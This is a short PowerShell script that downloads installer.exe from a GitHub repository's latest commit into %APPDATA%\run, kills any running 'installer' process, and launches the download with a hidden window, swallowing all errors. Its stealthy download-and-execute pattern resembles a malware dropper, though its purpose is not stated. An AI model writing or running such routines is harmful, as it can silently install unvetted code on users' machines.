$p = "$env:APPDATA\run"
if (!(Test-Path $p)) {
  New-Item -ItemType Directory -Path $p | Out-Null
}

try {
  $headers = @{ "User-Agent" = "PowerShell-Updater" }
  $sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main' -Headers $headers).sha
  $o = "$p\installer.exe"

  Stop-Process -Name "installer" -ErrorAction SilentlyContinue

  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$sha/installer.exe" -OutFile $o -Headers $headers -UseBasicParsing
  Start-Process -FilePath $o -WindowStyle Hidden
}
catch {
}
